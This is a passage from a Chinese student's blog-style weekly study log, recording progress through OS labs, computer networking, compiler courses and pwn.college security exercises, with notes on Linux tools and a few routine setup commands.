href="#第二十三周-12-13-12-19" class="headerlink" title="第二十三周: 12/13-12/19"></a>第二十三周: 12/13-12/19</h3><ul><li>花了几天看了CSAPP的处理器体系结构章节, 大有收获, 主要是pipeline processor的设计思考过程一步一步非常详细, 可以说是锻炼思维能力了, 但这只是1980s的理论水平</li><li>周四早上, 终于看完了Processor Architecture, 至于实验等假期再做吧, <u>继续开始操作系统内存管理部分</u> </li><li>周五, 操作系统Lab3, 安装了Windows default keymap, linux里的vscode勉强能用</li><li>可能需要切换一下策略, 直接参照答案学习, 理解写出文档就算成功, 不然看了两天才补完Lab1中的challenge, 还以为是task switch…</li><li>明天看看自动完成合并的diff和patch命令</li></ul><h3 id="第二十四周-12-20-12-26"><a href="#第二十四周-12-20-12-26" class="headerlink" title="第二十四周: 12/20-12/26"></a>第二十四周: 12/20-12/26</h3><p>本周的任务是操作系统, 一下是除了这个之外的小东西</p><ul><li><p>典中典: <strong>我以为我看懂了</strong> </p></li><li><p>STI指令: 响应可屏蔽的硬件中断, 在kern_init()中的intr_enable()执行, 就算没设置也能执行<strong>软中断</strong> </p></li><li><p>Typora崩溃了, 我也快崩溃了, 写了三天的东西莫得了, 自动保存直接断绝后路</p></li><li><p>完善了一下用来备份的bat程序, 每十分钟备份一次(我就是要自动保存!</p></li><li><p>c/c++默认返回值是<strong>1</strong>, 我没写导致出错</p></li><li><p>周三, 整了下快捷方式的快捷键; 学点patch和diff的补丁文件, 知识get!</p><ul><li><p>装了个tree包</p></li><li><p><a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html">diff输出文件</a> <a href="https://blog.csdn.net/longintchar/article/details/74151042">patch一般方法</a> <a href="https://blog.csdn.net/longintchar/article/details/74139933">diff一般方法</a> </p><p><code>patch -[R]pn &lt; 补丁文件</code> <code>diff -bruP [directory1] [directory2] &gt; [patchfilename.patch]</code> </p></li></ul></li><li><p>周四, 只能说那东西有点上头, 还是不碰为妙</p><ul><li><a href="https://www.zhihu.com/question/23014322">volatile相关</a> </li><li>ctrl+k在understand里面看大纲</li><li><a href="https://rtoax.blog.csdn.net/article/details/108663549">SLOB、SLAB、SLUB</a> </li></ul></li><li><p>周末:</p><ul><li>vscode的formatter用得顺手, 导致我diff+patch很难过T_T</li><li><strong>patch只能使用带有-u或者-c参数的diff文件</strong>, 而且带有上下文, patch很容易fail </li><li>vscode修改为大括号sameline: <code>&quot;C_Cpp.clang_format_style&quot;: &quot;&#123;BasedOnStyle: Chromium, IndentWidth: 4&#125;&quot;</code><br><a href="https://blog.csdn.net/softimite_zifeng/article/details/78357898">clang-format参数</a> </li></ul></li></ul><h3 id="第二十五周-12-27-1-2"><a href="#第二十五周-12-27-1-2" class="headerlink" title="第二十五周: 12/27-1/2"></a>第二十五周: 12/27-1/2</h3><ul><li>周一, 经典再现, 我果然没有看懂地址映射的四个阶段, 又重新看了一次ucore自带的一个设置好的页目录表和相应的页表<br>又折腾了半天</li><li>装了一个info包, 暂时只知道能看info ld</li><li><code>make grade</code>在虚拟机共享文件夹里出错了, 诶想省事又有点麻烦的东西</li><li>弄了一个多小时, 博客想加上汇编代码高亮, 没有成功, 和Typora的配合不是很好, 鸽了</li><li>Dirty COW的网站上有个东西好有趣<ul><li>How do I uninstall Linux? Please follow <a href="https://youtu.be/MZrdrfdAl44?t=14">these</a> instructions. </li></ul></li><li>VMware对于在虚拟机中选中的文本会自动复制到宿主机中</li><li>周四, ucore开始快一个月了, 进展到了Lab6</li><li>发现未知名词POC, 是<a href="https://github.com/knownsec/pocsuite3">pocsuite</a> </li><li>折腾了快一个小时, 结果发现需要update lab5的代码才能正确make qemu, 乌鱼子………为什么总在这种无意义的事情上浪费时间<ul><li>周五下午三点, 人已被气晕, exercise0怎么改都不行, 重新clone了肖佬的lab6, 绝了</li><li>发现肖佬是把出错的那一句直接注释了, 未曾设想的道路</li></ul></li><li>元旦当天, 不进行格式化的合并就是舒服 &amp;&amp; 尝试clash再次失败, 下次不弄了</li><li>装了一个apt install <a href="https://graphviz.org/">graphviz</a>, an open source graph visualization software</li><li>深受翻译版所害, signaling process直接叫做信号进程</li></ul><h3 id="第二十六周-1-3-1-9"><a href="#第二十六周-1-3-1-9" class="headerlink" title="第二十六周:1/3-1/9"></a>第二十六周:1/3-1/9</h3><ul><li>开始lab8</li><li>print working directory = pwd</li><li><a href="https://blog.csdn.net/weixin_40204595/article/details/81109644?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&utm_relevant_index=1">C语言宏定义中 ## 和#的作用</a> </li><li>magic numbers</li><li>这个highlightjs+hexo我不改变一下文件他就不动配置了, 搞得代码块白底白字, 还得手动在每个文件都加上一个空格.</li><li>do {…} while (0) 在宏定义中的作用: 能够正确的让多条语句按我们的意愿工作.</li><li>尝试了一下ssh连接虚拟机, 只要执行一下几条命令即可, 使用了一下XShell, 要弹出qemu的窗口还要装东西……<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get update<br>apt-get install openssh-server<br>systemctl <span class="hljs-built_in">enable</span> ssh.service<br>vim /etc/ssh/sshd_config <span class="hljs-comment"># 改成允许root用户登录</span><br>/etc/init.d/ssh restart<br></code></pre></div></td></tr></table></figure></li><li>要用understand记得要注意编码问题以及及时重新分析所有文件(windows默认GBK编码</li><li>周六, 虽然在复习周, 但是马上就要完成ucore了. <strong>周天, ucore完成</strong> </li><li>装上了ahk语法高亮, 硬是整了个小脚本</li></ul><hr><h2 id="开始寒假-pwn-college-计网"><a href="#开始寒假-pwn-college-计网" class="headerlink" title="开始寒假(pwn.college+计网)"></a>开始寒假(pwn.college+计网)</h2><h3 id="第二十七周-1-10-1-16"><a href="#第二十七周-1-10-1-16" class="headerlink" title="第二十七周:1/10-1/16"></a>第二十七周:1/10-1/16</h3><ul><li>gVim是vim的一种, 指GUI Vim, 还有其他的模式可以通过 vim -参数 来指定</li><li>考试周, 看了一点pwn.college的YouTube视频, 介绍视频感觉还挺多的, 是时候再写一篇blog了</li><li>对了, 每天要复习一点前面的东西, 不然到时候就等于重新看了</li><li>考完了, 考 完了, 考 完了, 16号开始一点计算机网络, 计算机系统, 和pwn.college<ul><li>找到了计算机网络书配套网站: <a href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/">部分资源</a>以及<a href="http://gaia.cs.umass.edu/kurose_ross/index.php">主页</a>, 以及在Z-library上找到了英文第八版.</li><li><a href="http://gaia.cs.umass.edu/kurose_ross/eighth.php">第八版的改动</a> </li><li>别人的计网<a href="https://blog.csdn.net/wwj17647590781/category_11065625.html?spm=1001.2014.3001.5482">笔记</a> </li><li>研究笔记要怎么写用了一点时间, 干点别的去了</li></ul></li></ul><h3 id="第二十八周-1-17-1-23"><a href="#第二十八周-1-17-1-23" class="headerlink" title="第二十八周:1/17-1/23"></a>第二十八周:1/17-1/23</h3><ul><li><strong>17: 看计网, 明天开始pwn.college</strong> </li><li><strong>18:</strong> 找到了一个下载Github单个文件夹的<a href="https://downgit.github.io/#/home">网站</a>, 以及把tree/master替换为<strong>trunk</strong>. 然后用：svn checkout [source]</li><li>计网开始第二章, 第一章东西也真够多的</li><li>看一点concurrent programing….还有先后关系, 先看network programming…呃呃, 还是看system I/O吧…</li><li><strong>19:</strong> <a href="https://www.cnblogs.com/zy691357966/category/827251.html">CSAPP笔记</a>全markdown的狠人</li><li><a href="https://www.jianshu.com/p/9268ac2c8e5f">掩码</a>是个啥, Youtube<a href="https://www.edunews.net.cn/2020/hlw_0622/11069.html">快捷键</a> </li><li>看了CSAPP后几章和pwn.college.</li><li><strong>20:</strong> <a href="http://blog.chinaunix.net/uid-9474419-id-400907.html">/dev/tty和pty等等</a> </li><li>还在ELF格式中挣扎. </li><li><strong>21:</strong> Xshell的<a href="https://www.kali.org/docs/general-use/python3-transition/">警告信息</a>, 不想看, 只要<code>touch ~/.hushlogin</code>这个文件就可以隐藏了, 删除后又显示</li><li>看了一点computer networking</li><li>man手册还能<a href="https://www.cnblogs.com/chao1118/p/3715523.html">装中文</a>, 不想折腾了, 安排了<code>apt install manpages-dev</code>可以查看系统调用</li><li><strong>22:</strong> cc命令最终链接到gcc, 这是为了向后兼容</li><li>连pwn.college慢的一批, 也为了计算机系统课装个Ubuntu了, 再弄个clash</li><li>见识到了好多新的命令, linux有多的操作就写在Linux使用里吧.<ul><li>干脆把那个弄成清单, 然后具体细节写在每个WP里就可以了</li><li>runoob上的命令大全每天看一点得了, <strong>至少混个眼熟</strong> </li></ul></li><li><strong>23:</strong> 终于, 在ubuntu弄好了clash, 深深感到原理一个都不知道只会操作软件的痛苦….<a href="http://t.zoukankan.com/huang-xiang-p-13922394.html">link</a> </li><li>看计网</li></ul><h3 id="第二十九周-1-24-1-30"><a href="#第二十九周-1-24-1-30" class="headerlink" title="第二十九周 1/24-1/30"></a>第二十九周 1/24-1/30</h3><ul><li><strong>24:</strong> 继续很多的计网和一点pwn.college</li><li><strong>25:</strong> ASCII码中的<a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#C1_controls">控制字符</a>就是按键盘上的Ctrl+字母符号来打出的,<br><strong>Caret(^) notation</strong> is a notation for unprintable control characters in ASCII encoding<br>The actual meaning or interpretation of the individual control-codes is not prescribed by the caret notation, and although the ASCII specification does give names to the control-codes, it does not prescribe how software should respond to them.</li><li>学了一波screen, <del>也不知道有啥用就是了…</del> , 真香.</li><li>快捷键没完没了了, <strong>一个终端还有这么多</strong> </li><li>pwn.college做到了(?)</li><li><strong>26:</strong> 一点点pwn.college和科目四</li><li><strong>27:</strong> pwn.college+computer networking</li><li>看了一篇PIPE&amp;FIFO的文章, 看不下去了话真的太多了, 也是佩服一篇博客需要这么多字的. <strong>还是linux manual管用</strong>.</li><li><strong>28-30</strong> 看计网和pwn.college.</li></ul><h3 id="第三十周-1-31-2-6"><a href="#第三十周-1-31-2-6" class="headerlink" title="第三十周 1/31-2/6"></a>第三十周 1/31-2/6</h3><ul><li>1/31: 除夕夜, 还在看计网. 看的属实有点慢.</li><li>2/1-2/2: 计网+春节.</li><li>2/3-4: 看书, 进度315/775</li><li>2/5: 连着看了几个小时看不下去了, 不重要的直接跳过不看了.</li></ul><h3 id="第三十一周-2-7-2-13"><a href="#第三十一周-2-7-2-13" class="headerlink" title="第三十一周: 2/7-2/13"></a>第三十一周: 2/7-2/13</h3><ul><li>2-8: 下午五点, 前六章看完. 巩固下知识(除了算法)</li><li>2-9-13: 终于看完了, (摸:fish:了一天)</li><li>开始pwn.college!</li></ul><h3 id="第三十二周-2-14-2-20"><a href="#第三十二周-2-14-2-20" class="headerlink" title="第三十二周: 2/14-2/20"></a>第三十二周: 2/14-2/20</h3><ul><li>14: 发现要自己写汇编代码, 之前看过的一部分还算用到了, 还好做了笔记不然和没看一样. 以前都是看现成的都没有自己写过.</li><li>python3.8特性: <a href="https://zhuanlan.zhihu.com/p/90992431">Assignment expressions</a>: <code>:=</code>和<code>=</code>是补充关系并不是替换关系</li><li><a href="https://cloud.tencent.com/developer/ask/106533">deadbeef渊源</a> 和<a href="https://en.wikipedia.org/wiki/Hexspeak">Hexspeak</a>有关系. 这个Hexspeak也挺有意思, 是用16进制数字来表示英文单词, 可用来编魔数.</li><li>15:  Linux的typora里双击或选中会自动删除文字居然是这个<a href="https://blog.csdn.net/litao31415/article/details/51082530">原因</a> </li><li>自己亲自动手写起汇编代码才发现这么多细节没有注意到, 要抓紧时间练练了, 这上面的题目还都比较基础嘞.</li><li>16: 还在pwn.college</li><li>Undefined Behavior -&gt; <a href="https://riptutorial.com/cplusplus/topic/1812/undefined-behavior">here</a> and <a href="https://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html">here</a> <ul><li>signed overflow (which is undifined behavior) -&gt; <a href="https://www.airs.com/blog/archives/120">here</a> and <a href="https://stackoverflow.com/questions/18195715/why-is-unsigned-integer-overflow-defined-behavior-but-signed-integer-overflow-is">stackoverflow</a> </li></ul></li><li>17: 一点点的pc, shellcode injection又有好多的资料引用和视频, 全看完得几天时间(一天半就看完了)</li><li>18: 看完了pc的shellcode module视频, 引用文章看个两篇就结束了.</li><li>复习操作系统. ….到底需要一个何等庞大的基础知识体系啊……(tm拖了两天才要开始)</li><li>看了一点disk image的相关wikipedia: <a href="https://en.wikipedia.org/wiki/Disk_image">disk image</a> | <a href="https://en.wikipedia.org/wiki/Loop_device">loop deivce</a> | <a href="https://en.wikipedia.org/wiki/Device_file#Block_devices">device file</a> <ul><li>还有Disk image和optical disc image区别:<br>A disk image, in computing, is a computer file containing the contents and structure of a disk volume <strong>or of an entire data storage device</strong><br>An optical disc image <strong>is a disk image</strong> that contains everything that would be written to an <strong>optical disc</strong> </li><li>Once you’ve downloaded an ISO Image you can mount it as a loopback device. </li><li>It may be used to install an operating system onto a file system without repartitioning a disk.</li></ul></li><li>19-20: 回学校准备中, 不知道学了啥, 至少是复习了ucore</li></ul><h2 id="开学了-pc-编译原理"><a href="#开学了-pc-编译原理" class="headerlink" title="开学了!(pc+编译原理)"></a>开学了!(pc+编译原理)</h2><h3 id="第三十三周-2-21-2-27"><a href="#第三十三周-2-21-2-27" class="headerlink" title="第三十三周 : 2/21-2/27"></a>第三十三周 : 2/21-2/27</h3><ul><li>21:复习CS143, 今天或许能复习完. <ul><li>答案是不能, <strong>诶明天随便看看bison的东西吧. 然后再看看cscd70, 再然后看看LLVM IR Pass</strong> </li></ul></li><li>22: 如上所述, 主要看了CSCD70. 今天没有课.</li><li><a href="https://en.wikipedia.org/wiki/Compiler#Three-stage_compiler_structure">What is complier’s front end</a> 在课件里找到了, 一开始还去WiKi上查.</li><li>23: 继续CSCD70(看完了lecture 1)</li><li>an <strong>induction variable</strong> is a variable that gets increased or decreased by a fixed amount on every iteration of a loop or is a linear function of another induction variable.</li><li>不知道该不该看视频, 感觉优点在于能练习一点听力以及听一些问答, 缺点的话会慢一些, 不过这么一想倒是利大于弊了.</li><li>24: 继续CSCD70. 第三个视频看了一半多</li><li><a href="https://en.wikipedia.org/wiki/Number_sign#Mathematics">Number sign</a> in <code>#def</code>. It turns out to be the mathematic sign.</li><li>25: 看完第三个. 查了live variable analysis的作用.</li><li>还查了计算机系统小班课的第二个问题: 不同操作系统, 不同编译器, 不同处理系架构对生成目标文件的过程有什么影响.<ul><li>gcc由cc1, as, ld三个部分组成, 另外一个llvm把cc1模块化为三个部分, 然后正常汇编, 链接时可选optimization.</li><li>Clang只是一个front end.</li></ul></li><li>26-27: 查RFC中的ipv4和ipv6, 不知道在哪里有写. 还有C99待看</li><li>复习补充linux命令(操作系统小班课)</li><li>有空看下IBM网站, 上面好像挺多有用的博客资料啥的..</li><li>system programming in c or c++? -&gt; <a href="https://darkbears.com/blog/why-c-continues-to-the-preferred-systems-programming-language/">link</a> </li><li>这两天都在做计网实验, 要写c99程序和测试程序, 边翻文档编写是慢了点. 不如说我敲代码好像一直都慢了点…..</li></ul><h3 id="第三十四周-2-27-3-6"><a href="#第三十四周-2-27-3-6" class="headerlink" title="第三十四周: 2/27-3/6"></a>第三十四周: 2/27-3/6</h3><ul><li>27-1: <a href="https://stackoverflow.com/questions/9257085/how-can-i-scroll-back-in-gdbs-command-window-in-the-tui-mode">How can I scroll back in GDB’s command window in the TUI mode?</a>  </li><li><a href="https://vimhelp.org/cmdline.txt.html#%5Brange%5D">vim range 范围</a> and <a href="https://vimhelp.org/usr_10.txt.html#10.3">this</a> </li><li>debugging Infomation: <a href="https://unix.stackexchange.com/questions/219550/what-is-linux-native-debugging-symbols-format">native format</a> | GCC 4.8 change to DWARF4 | -g -gstabs -gxcoff -gstabs+ | peda</li><li>2-4: 装docker看视频和pwn.college.<ul><li>docker的DNS解析错误无法<code>sudo apt-get update</code>, <a href="https://robinwinslow.uk/fix-docker-networking-dns">解决办法</a> (还是不如换源有用) .</li><li>看了几节多伦多大学油管上的英文视频还是挺有意思的, 就当锻炼了一下听力吧, 倒回来看哈工大视频. compiler的front end看的挺累的, 不过优化部分看起来意义更明了一些, 努力一下看下两三周弄得完不.</li></ul></li><li>5: 哈工大的视频相当紧凑, 不知道内容有没有少一些. 主要是英文没法两倍速, 要不然就听不懂了…..<ul><li>What is orchestration? -&gt; <a href="https://en.wikipedia.org/wiki/Orchestration_(computing)">WiKipedia</a> </li><li>What is the container? -&gt; <a href="https://medium.com/@saschagrunert/demystifying-containers-part-i-kernel-space-2c53d6979504">here</a> </li><li>CMake vs. Make , and What is CMake? <a href="https://www.incredibuild.com/blog/cmake-vs-make">link</a> </li></ul></li><li>6: 有点颓废.<ul><li>在看llvm的文档, 要不然这个过程是一无所知….. <a href="http://www.aosabook.org/en/llvm.html">link</a> </li><li><a href="https://en.wikipedia.org/wiki/Just-in-time_compilation#Design">JIT</a> and AOT(self-evident) | <a href="https://en.wikipedia.org/wiki/First-class_citizen">first class language</a>?? | Archive file | </li></ul></li></ul><h3 id="第三十五周-3-7-3-13"><a href="#第三十五周-3-7-3-13" class="headerlink" title="第三十五周: 3/7-3/13"></a>第三十五周: 3/7-3/13</h3><ul><li>7: <a href="https://devopsonwindows.com/what-makes-a-build-system/">build system</a> | 只能去看在线的llvm手册了.装好的docker还是别去执行unminimize这种命令了.</li><li>8: docker的相关命令.</li><li>9: 计网实验中. Return/Enter Key | Wireshark手册 | 每日单词进行中 | </li><li>10:什么神奇计网, 水过得了, 除了浪费时间没啥意义.</li><li>11: 啊啊啊我要学llvm, 怎么感觉前几天效率这么低呢.<ul><li>看了clang和llvm文档(比如-emit-code), 了解了一下如何写出一个pass. cmake写法待看.</li><li>指导书里面的clang还有优化选项, 不明白这是在整啥, 去掉好像也没事. clang到底是前端还是编译驱动啊? </li><li>取消windows防火墙阻挡ICMP报文. <a href="https://superuser.com/questions/1412029/traceroute-shows-just-in-linux-in-a-virtual-machine-although-displays">link</a> </li></ul></li><li>12: 开卷.<ul><li>整了个<strong>zsh</strong>. <a href="https://seamatinee.com/2021/09/23/ubuntu-customization/#Terminal-%E7%BE%8E%E5%8C%96">link</a> | C++作者<a href="https://www.stroustrup.com/C++.html">网站</a> | RTTI, 没看懂 | first class也没看懂 | <a href="https://www.doxygen.nl/index.html">doxygen</a>是个啥 | clash添加规则</li><li>还在Assignment1, 把LLVM的东西看一遍哪有这么快啊.</li></ul></li><li>13: 又看了一天的文档+补掉课内的无聊作业. 把LLVM设计结构看了个大概, 有点通透的感觉了(</li></ul><h3 id="第三十六周-3-14-3-20"><a href="#第三十六周-3-14-3-20" class="headerlink" title="第三十六周: 3/14-3/20"></a>第三十六周: 3/14-3/20</h3><ul><li>14: 怎么还在看文档. 弄了vscode编辑, 纯vim真是接受不能. woc好像快三周了, 我还没搞完, 还有makefile和cmake的语法没看呢.</li><li>15: <a href="https://en.wikipedia.org/wiki/User_space_and_kernel_space#USERLAND">userland</a>(user space) | <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a> | <a href="https://en.wikipedia.org/wiki/Copyleft">copyleft</a>,<a href="https://en.wikipedia.org/wiki/GNU_General_Public_License">GPL</a> | Ninja | <ul><li>看了cmake&amp;&amp;make&amp;&amp;C++虚继承. 然后开始写代码.</li></ul></li><li>16:  static member functions(<a href="https://stackoverflow.com/questions/2315166/where-would-you-use-a-friend-function-vs-a-static-member-function">stackover</a> &amp; <a href="https://en.cppreference.com/w/cpp/language/static">cppref</a>) | <ul><li><code>replaceAllUsesWith()</code>这个函数我看了半天, stackoverflow查了查llvm文档又看了看, 还去doxygen看源码, 终于看懂llvm是怎么组织这一对关系的了. 具体在CSCD70笔记里.</li></ul></li><li>17: 继续cmake和Assignment2.<ul><li>搜到一篇好文, vim的窗口使用, <a href="https://linuxhint.com/opening_switching_multiple_files_vim/">here</a> </li></ul></li><li>18-20: pwn.college</li></ul><h3 id="第三十七周-3-21-3-27"><a href="#第三十七周-3-21-3-27" class="headerlink" title="第三十七周: 3/21-3/27"></a>第三十七周: 3/21-3/27</h3><ul><li>21-23: capstone engine(一个反汇编引擎) | <a href="https://www.geeksforgeeks.org/difference-between-fork-and-vfork/">vfork&amp;fork</a> <ul><li>pwn.college.</li></ul></li><li>24: <a href="https://en.wikipedia.org/wiki/Concolic_testing">concolic execution</a> | <a href="https://en.wikipedia.org/wiki/Symbolic_execution">Symbolic execution</a> | <p hidden>小班真折磨, <strong>水平差太多</strong>有点无法沟通的感觉, 我书都看完了他们才刚开始….</p> </li><li>25-26: 封校, 计网小班, 无了</li><li>27: windows网卡必须是英文名才能代理 | <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> 和 System V的linux系统调用<a href="https://blog.csdn.net/return_cc/article/details/78417642">关系</a>| <ul><li>pwn.college</li></ul></li></ul><h3 id="第三十八周-3-28-4-3"><a href="#第三十八周-3-28-4-3" class="headerlink" title="第三十八周: 3/28-4/3"></a>第三十八周: 3/28-4/3</h3><ul><li>28-29: 疫情疫情疫情  pwncollege | discord’s direct message (DM) | <a href="https://tanqisen.github.io/blog/2013/01/13/vim-search-replace-regex/">vim regex</a> | <a href="https://en.wikipedia.org/wiki/Binary_File_Descriptor_library">BFD</a> &amp; objdump+readelf<br><a href="https://docs.kernel.org/filesystems/proc.html">/proc(kernel doc)</a> | <a href="https://floatingoctothorpe.uk/2017/dumping-memory-with-gdb.html">dumping memory with gdb</a> | <p hidden>复习了一下malloc以及gdb中的操作, 因为执行环境的原因之前的堆题我都没有使用过gdb来调试, 今天趁着小班课一弄累得半死, 一会儿对齐没搞明白, 一会儿小端法没看出来, 又一回儿被指针弄晕(把指向堆的指针赋值为只读data, 还在那儿想为什么p1不在maps里的heap段中???? 真绝了, 不过复习了一点点点点malloc, 熟悉了一下gdb的操作.</p></li><li>30: <a href="https://luomuxiaoxiao.com/?p=516">elf启动流程</a>(是时候看看程序员的自我修养了) | <p hidden>小班课又栽进去几个小时, 好心录个视频希望更多人能看见吧.</p> </li><li>31-1: <p hidden>啊这, 一个小班课上午基本就没了, 然后下午调了下mykeymap, 晚上看了看日语和单词, 看了看bomblab, 一天没了……</p>bash的<a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html">manual</a>可以一看 | <ul><li>看sandboxing的视频, 看了两遍感觉细节还是很多. 就像我小班课上和别人讲题目, 一些小操作我都没有去解释, 第一次见肯定会觉得信息量过大.</li></ul></li><li>2: <a href="https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con">tty terminal shell…</a>&amp;<a href="https://askubuntu.com/questions/14284/why-is-a-virtual-terminal-virtual-and-what-why-where-is-the-real-terminal">short explain</a>&amp;<a href="https://en.wikipedia.org/wiki/Computer_terminal">computer terminal</a> | pwn.college-babyjail.<ul><li>terminal在以前是一台实际的设备, 在今天的图形化界面系统中更多使用的是terminal emulator, 而不需要一台真实的terminal.</li><li><strong>tty</strong>–teletype(writer): accessing the computer by sending keystrokes to it and receiving output back from it, printing it to a piece of paper.</li><li>gnome-terminal and konsole are themselves <strong>running on a tty</strong>, 包括graphical subsystem.</li><li>为什么在termnal emulators里能使用^H(就是backspace)这样的<a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape code</a>? 因为尽管hardware text terminals have become increasingly rare in the 21st century, the relevance of the ANSI standard persists because a great majority of terminal emulators and command consoles interpret at least a portion of the ANSI standard.</li></ul></li><li>3: babyjail | gcc编译选项:<code>-masm=intel</code>gdb选项:<code>set disassembly-flavor intel</code> | 找到了所有的视频</li></ul><h3 id="第三十九周-4-4-4-10"><a href="#第三十九周-4-4-4-10" class="headerlink" title="第三十九周: 4/4-4/10"></a>第三十九周: 4/4-4/10</h3><ul><li>4: <a href="https://stackoverflow.com/questions/2529185/what-are-cfi-directives-in-gnu-assembler-gas-used-for">CFI directives</a>&amp;<a href="https://stackoverflow.com/questions/38552116/how-to-remove-noise-from-gcc-clang-assembly-output">complier option</a> | 看视频中, 没找到想要的</li><li>5: <a href="https://www.baeldung.com/linux/posix">guide to POSIX</a>&amp;<a href="https://pubs.opengroup.org/onlinepubs/9699919799/nframe.html">full doc</a> | pwn.babyjail to 10 | <a href="https://unix.stackexchange.com/questions/515881/what-does-the-ep-capability-mean">StackOverflow上的capability(ies)</a>, man上也有, 是chroot权限的背后原因 </li><li>6-7: bash的手册也得看下, 操作好多, 主要是shell语言的规则. 第二天bomblab重做(32位的…….)</li><li>8-10:  gdb refresher</li></ul><h3 id="第四十周-4-11-4-17"><a href="#第四十周-4-11-4-17" class="headerlink" title="第四十周: 4/11-4/17"></a>第四十周: 4/11-4/17</h3><ul><li>11: 没做啥</li><li>12 13: <a href="https://unix.stackexchange.com/questions/6155/can-i-easily-search-my-history-across-many-screen-windows">history in screen</a> | make的语法也太多了…….要对文档PTSD了 | 13看了点计网小班.浪费时间的东西.</li><li>14: reverse engineering…. 我真的认真的只看汇编, 但是一想也没必要, 都用IDA pro了. 然后下载了pwnsh, 加上三个gdb插件安装脚本, 再熟悉了一下IDA的界面, 然后写个python脚本东查查西查查(list comprehension), 最后看了看视频, 知道了gdb调试set-uid的程序不能成功derandomize以及IDA添加struct类型等等来完善decompiled code, 用了<strong>整个</strong>下午和晚上. 好像是学了点东西…..</li><li>15-17: reverse !<br>IDA的<a href="https://eviatargerzi.medium.com/remote-debugging-with-ida-from-windows-to-linux-4a98d7095215">远程gdb</a> | pluginlist(一时半会儿用不到,先star)</li></ul><h3 id="第四十一-二周-4-18-5-1"><a href="#第四十一-二周-4-18-5-1" class="headerlink" title="第四十一/二周: 4/18-5/1"></a>第四十一/二周: 4/18-5/1</h3><ul><li>18满课(…)19做了一点20-22<u>IDA debug</u>| reverse engineering</li><li>23: memory error, 弄了pwndbg的多视图和tmux. 比screen好用, 还能整鼠标(</li><li>26: 继续memory error, 7做到12</li><li>27: 视频里真有一些没见过的用法….要不要花时间看呢?</li><li>剩下几天做到了exploitation的第7题. </li></ul><h3 id="第四十二周-5-2-5-8"><a href="#第四十二周-5-2-5-8" class="headerlink" title="第四十二周: 5/2-5/8"></a>第四十二周: 5/2-5/8</h3><ul><li>3: exp的第七题开始Yan85, 回顾了一下rev的18+19.</li><li>4-5: 过了一遍mem, 看了rop视频, 在整heap.</li><li>6-7: 在整rop. 还是有以前那几道ctf题里没见过的东西, 毕竟这课程会更系统一点.<br><a href="https://bbs.pediy.com/thread-254868-1.htm">不同版本libc使用</a> | </li><li>8:rop. 打算看两眼ROPgadget的实现, 了解一下python项目. <ul><li>试了下gdb的record和reverse exec.</li></ul></li></ul><h3 id="第四十三周-5-9-5-15"><a href="#第四十三周-5-9-5-15" class="headerlink" title="第四十三周: 5/9-5/15"></a>第四十三周: 5/9-5/15</h3><ul><li>9-10: rop</li><li>11-12: race condition</li><li>13: race + 补一下<strong>shell programming</strong>(详见linux使用), 都查到了POSIX的标准了.</li><li>14-15: race, level1测试+shell编写, 结果level5直接卡住过不了. 下周看视频去了.<ul><li>………………….感觉还是得用python, 没有用shell的. os模块挺多函数. 不过shell看了下也不亏(大概)</li></ul></li></ul><h3 id="第四十四周-5-16-5-22"><a href="#第四十四周-5-16-5-22" class="headerlink" title="第四十四周: 5/16-5/22"></a>第四十四周: 5/16-5/22</h3><ul><li>16-17: race到8, 17号看office hour中的level8 socket, 感觉前面的socket相关都跳过了不太好…..</li><li>18: 写了python的并行. vim安装了点插件.</li><li>19: 继续race | pthread锁 |  awk语言<ul><li>又不明所以地做完了level9, level10一个绕过semaphore又整不会了, 看视频去了.</li></ul></li><li>20: race完成+kernel一点视频</li><li>21: LibcSearcher和python包安装更新,整理root文件夹 | pwn_kernel环境搭建+视频 | 看linux inside syscall part1 | </li><li>22: pwnkernel, 内容很多.<br><a href="https://www.kernel.org/doc/man-pages/">online manpage</a> | </li></ul><h3 id="第四十五周-5-23-5-29"><a href="#第四十五周-5-23-5-29" class="headerlink" title="第四十五周: 5/23-5/29"></a>第四十五周: 5/23-5/29</h3><ul><li>23: kernel vedio + online challenge usage</li><li>24: kernel challenge to 6(half complete)</li><li>25: Computer Network Lab5: root dns server on local machine. + 计系小班</li><li>26-27: kernel大概做完了 | 了解一下CTFtime上的东西.</li><li>28: 愚蠢的验收浪费一天时间. 本科像是个笑话</li><li>29: advanced, vedio+note.</li></ul><h3 id="第四十六周-5-30-6-5"><a href="#第四十六周-5-30-6-5" class="headerlink" title="第四十六周: 5/30-6/5"></a>第四十六周: 5/30-6/5</h3><ul><li>30: <p hidden>我焯,  改变策略, 全力保研, 居然能在分流后保研边缘, 马上开始内卷.</p> </li><li>31-5: 复习+一点点advance.</li></ul><h3 id="第四十七周-6-6-6-12"><a href="#第四十七周-6-6-6-12" class="headerlink" title="第四十七周: 6/6-6/12"></a>第四十七周: 6/6-6/12</h3><ul><li> 6-7: 复习周.</li></ul><h2 id="开始暑假"><a href="#开始暑假" class="headerlink" title="开始暑假"></a>开始暑假</h2><p>重新计数, 因为大二结束了(小学期不是个东西, 所以不算)</p><h3 id="第一周-6-13-6-19"><a href="#第一周-6-13-6-19" class="headerlink" title="第一周: 6/13-6/19"></a>第一周: 6/13-6/19</h3><ul><li>13-16: 期末考试</li><li>17: 重新看最后一章</li><li>18: 发现代码中还是有很多细节, 仔细分析视频中, 并且对代码做了一点小修改.</li><li>19: 在kali2021上的libc2.33中(比2.31多了tcache对齐检查和地址保护)实现了任意读写原语构造, 完全理解了示例代码中的每一行的操作. 不过在context.binary忘加上这里卡了挺久…….仍然在level1.<br>scanf 和 printf 的空字节读写问题 | tcache 